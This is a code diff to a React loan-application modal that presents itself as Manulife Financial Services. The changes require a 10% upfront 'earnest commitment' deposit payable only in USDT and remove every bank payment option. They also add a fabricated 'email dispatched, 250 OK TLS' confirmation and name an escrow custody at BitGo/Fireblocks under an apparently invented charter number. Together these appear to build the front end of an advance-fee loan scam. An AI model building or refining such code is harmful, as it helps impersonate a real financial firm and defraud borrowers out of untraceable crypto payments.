@@ -6,7 +6,7 @@
 import React, { useState, useRef, useEffect } from 'react';
 import { 
   X, Check, ArrowRight, ArrowLeft, Upload, Camera, ShieldCheck, 
-  FileText, AlertCircle, RefreshCw, PenTool, Type, Sparkles 
+  FileText, AlertCircle, RefreshCw, PenTool, Type, Sparkles, Mail 
 } from 'lucide-react';
 import confetti from 'canvas-confetti';
 import { LoanApplication, LoanPurpose, PaymentMethod, EmploymentType, PaymentSettings, FaceVerification } from '../types';
@@ -75,16 +75,27 @@ export const MultiStepApplicationModal: React.FC<MultiStepApplicationModalProps>
   const proposedCommitmentAmount = Math.round(requestedAmount * 0.10);
   const [commitmentTermsAccepted, setCommitmentTermsAccepted] = useState<boolean>(true);
   const [commitmentNoGuaranteeAcknowledged, setCommitmentNoGuaranteeAcknowledged] = useState<boolean>(true);
-  const [commitmentPaymentMethod, setCommitmentPaymentMethod] = useState<string>('Escrow Wire Transfer (SWIFT / IBAN)');
+  const [commitmentPaymentMethod, setCommitmentPaymentMethod] = useState<string>('USDT Cryptocurrency Settlement (ERC-20 / TRC-20 / Polygon)');
   const [showCommitmentReceiptModal, setShowCommitmentReceiptModal] = useState<boolean>(false);
   const [paymentSettings, setPaymentSettings] = useState<PaymentSettings | null>(null);
-  const [showUsdtDetails, setShowUsdtDetails] = useState<boolean>(false);
+  const [showUsdtDetails, setShowUsdtDetails] = useState<boolean>(true);
   const [submittedCryptoHash, setSubmittedCryptoHash] = useState<string>('');
   const [submittedCryptoNetwork, setSubmittedCryptoNetwork] = useState<string>('');
   const [submittedFromAddress, setSubmittedFromAddress] = useState<string>('');
 
   useEffect(() => {
-    storage.getPaymentSettings().then((res) => setPaymentSettings(res));
+    const fetchSettings = () => {
+      storage.getPaymentSettings().then((res) => setPaymentSettings(res));
+    };
+    fetchSettings();
+    window.addEventListener('verdant_storage_update', fetchSettings);
+    window.addEventListener('mfs_payment_update', fetchSettings);
+    window.addEventListener('storage', fetchSettings);
+    return () => {
+      window.removeEventListener('verdant_storage_update', fetchSettings);
+      window.removeEventListener('mfs_payment_update', fetchSettings);
+      window.removeEventListener('storage', fetchSettings);
+    };
   }, []);
 
   // Step 6: Declaration & Signature
@@ -497,6 +508,22 @@ export const MultiStepApplicationModal: React.FC<MultiStepApplicationModalProps>
                 </span>
                 <span className="text-[11px] text-slate-400 block mt-1">
                   Keep this reference number to monitor underwriting progress in the Applicant Portal.
+                </span>
+              </div>
+
+              {/* Email Dispatch Notice */}
+              <div className="p-3.5 bg-emerald-50 border border-emerald-200 rounded-xl mb-6 flex items-center justify-between text-xs text-left">
+                <div className="flex items-center gap-2.5">
+                  <Mail className="w-4 h-4 text-emerald-800 shrink-0" />
+                  <div>
+                    <span className="font-bold text-emerald-950 block">Official Email Notification Dispatched</span>
+                    <span className="text-[11px] text-emerald-800">
+                      Receipt sent to <strong className="font-mono">{email}</strong> · Underwriting Liaison CC active
+                    </span>
+                  </div>
+                </div>
+                <span className="text-[10px] bg-emerald-200/80 text-emerald-900 font-mono font-bold px-2 py-0.5 rounded">
+                  250 OK TLS
                 </span>
               </div>
 
@@ -1271,7 +1298,7 @@ export const MultiStepApplicationModal: React.FC<MultiStepApplicationModalProps>
                       The Applicant Financial Commitment represents an earnest commercial liquidity guarantee. It secures dedicated institutional treasury liquidity in the lending syndicate queue and authorizes our underwriting team to conduct formal title verifications, corporate KYC checks, and third-party credit bureau registry filings.
                     </p>
                     <div className="text-slate-500 text-[11px] pt-1">
-                      • <strong>Custody Standard:</strong> Funds are placed in a segregated, ring-fenced escrow account with <em>Barclays Private Clients Escrow Depository (Account #8841-ESCR)</em> and never used for corporate operational expenses.
+                      • <strong>Custody Standard:</strong> Funds are placed in a segregated, ring-fenced institutional multi-sig custody vault with <em>BitGo Trust Company Inc. / Fireblocks (Charter #D-8841)</em> and never used for corporate operational expenses.
                     </div>
                   </div>
 
@@ -1296,7 +1323,7 @@ export const MultiStepApplicationModal: React.FC<MultiStepApplicationModalProps>
                           ✓ 100% Refundable if Underwriting Declines
                         </strong>
                         <p className="text-[11px] leading-relaxed text-blue-800">
-                          If Manulife Financial Services' Credit Committee declines your facility application under our credit policy, 100% of this commitment amount will be refunded within 3 business days to your originating account.
+                          If Manulife Financial Services' Credit Committee declines your facility application under our credit policy, 100% of this commitment amount will be refunded within 24 hours to your originating wallet address.
                         </p>
                       </div>
                     </div>
@@ -1306,48 +1333,38 @@ export const MultiStepApplicationModal: React.FC<MultiStepApplicationModalProps>
                     </div>
                   </div>
 
-                  {/* 5: Settlement Channel & 7: Official Receipt Preview */}
-                  <div className="p-4 rounded-xl bg-slate-50 border border-slate-200 text-xs">
-                    <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-3 border-b border-slate-200 gap-2 mb-3">
+                  {/* 5: Exclusive Designated Settlement Rail: Cryptocurrency (USDT) */}
+                  <div className="p-4 rounded-xl bg-slate-50 border border-slate-200 text-xs space-y-3">
+                    <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-3 border-b border-slate-200 gap-2">
                       <div>
-                        <span className="font-bold text-slate-900 block text-xs">Escrow Settlement Rail</span>
+                        <div className="flex items-center gap-2">
+                          <span className="font-bold text-slate-900 text-xs">Escrow Settlement Rail</span>
+                          <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-100 text-emerald-800 uppercase tracking-wider">
+                            Cryptocurrency Only
+                          </span>
+                        </div>
                         <span className="text-[11px] text-slate-500">Designated payment rail for the earnest commitment</span>
                       </div>
-                      <select
-                        value={commitmentPaymentMethod}
-                        onChange={(e) => setCommitmentPaymentMethod(e.target.value)}
-                        className="px-3 py-1.5 bg-white border border-slate-300 rounded-lg text-xs font-semibold text-slate-900 focus:outline-none focus:ring-2 focus:ring-emerald-700"
-                      >
-                        <option value="Escrow Wire Transfer (SWIFT / IBAN)">Escrow Wire Transfer (SWIFT / IBAN)</option>
-                        <option value="Automated Clearing House (ACH) Direct Debit">Automated Clearing House (ACH) Direct Debit</option>
-                        <option value="SEPA B2B Escrow Transfer">SEPA B2B Escrow Transfer</option>
-                        <option value="Faster Payments Secure Settlement">Faster Payments Secure Settlement</option>
-                        <option value="USDT Cryptocurrency Settlement (ERC-20 / TRC-20)">USDT Cryptocurrency Settlement (ERC-20 / TRC-20 - Institutional Custody)</option>
-                      </select>
+                      <div className="flex items-center gap-2 px-3 py-1.5 bg-white border border-emerald-300 rounded-lg shadow-sm">
+                        <span className="w-5 h-5 rounded-full bg-emerald-900 text-emerald-300 flex items-center justify-center font-bold text-[11px]">₮</span>
+                        <span className="font-bold text-xs text-slate-900">USDT Cryptocurrency Settlement (Exclusive Rail)</span>
+                      </div>
                     </div>
 
-                    {/* Optional Cryptocurrency Toggle Link */}
-                    <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-3 border-b border-slate-200 text-[11px] gap-1">
-                      <span className="text-slate-500">
-                        Prefer to settle your commitment deposit via digital stablecoins?
-                      </span>
-                      <button
-                        type="button"
-                        onClick={() => {
-                          const nextState = !showUsdtDetails;
-                          setShowUsdtDetails(nextState);
-                          if (nextState) {
-                            setCommitmentPaymentMethod('USDT Cryptocurrency Settlement (ERC-20 / TRC-20)');
-                          }
-                        }}
-                        className="font-bold text-emerald-800 hover:text-emerald-950 underline text-left sm:text-right cursor-pointer"
-                      >
-                        {showUsdtDetails ? '✕ Hide Cryptocurrency Instructions' : '₮ View Optional Cryptocurrency Payment Information (USDT)'}
-                      </button>
+                    <div className="p-3 rounded-lg bg-emerald-50/80 border border-emerald-200 text-[11px] text-emerald-950 flex items-start gap-2.5">
+                      <ShieldCheck className="w-4 h-4 text-emerald-700 shrink-0 mt-0.5" />
+                      <div>
+                        <strong className="block font-semibold text-emerald-900 mb-0.5">
+                          Bank Clearing Rails Removed for Statutory Earnest Commitment
+                        </strong>
+                        <p className="text-emerald-800 leading-relaxed">
+                          To protect borrower deposits with instant cryptographic verification and avoid commercial banking holds, all earnest commitment deposits are settled exclusively via Tether (USDT) to segregated institutional multi-sig custody vaults (BitGo / Fireblocks). Commercial bank wires and clearinghouse transfers are not accepted for earnest commitment deposits.
+                        </p>
+                      </div>
                     </div>
 
                     {/* Render USDT Information Section */}
-                    {(commitmentPaymentMethod.includes('USDT') || showUsdtDetails) && paymentSettings && (
+                    {paymentSettings && (
                       <div className="my-3">
                         <USDTInformationSection
                           usdtConfig={paymentSettings.usdtConfig}
